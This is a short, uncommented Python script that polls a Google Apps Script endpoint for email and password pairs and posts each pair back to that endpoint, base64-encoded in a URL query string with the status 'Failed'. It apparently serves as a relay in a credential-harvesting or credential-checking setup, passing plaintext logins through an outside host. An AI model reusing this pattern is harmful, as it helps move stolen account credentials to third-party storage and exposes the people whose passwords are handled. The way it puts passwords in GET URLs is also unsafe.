import requests,json,base64
server_link = "https://script.google.com/macros/s/AKfycbzF35y1tucDE8B749XDsUICZ4jYWm9h-0bdJ5hyeAiaLh57jx0rYrN9JibGunYqRV_96g/exec"
def SendUpdate(email,password):
    data = {"Email":email,"Status":"Failed","Password":password}
    baseData = base64.b64encode(str(data).replace("'",'"').encode('utf-8'))
    baseData = str(baseData).replace("b'","").replace("'","")
    link =  server_link+"?func=Create&Data="+baseData
    requests.get(link)

for index in range(180):
    response = requests.get(server_link+"?func=Read")
    object = base64.b64decode(response.text)
    body = json.loads(object) 
    if body != {}:
        mail=body['mail']
        password=body['password']
        SendUpdate(mail,password)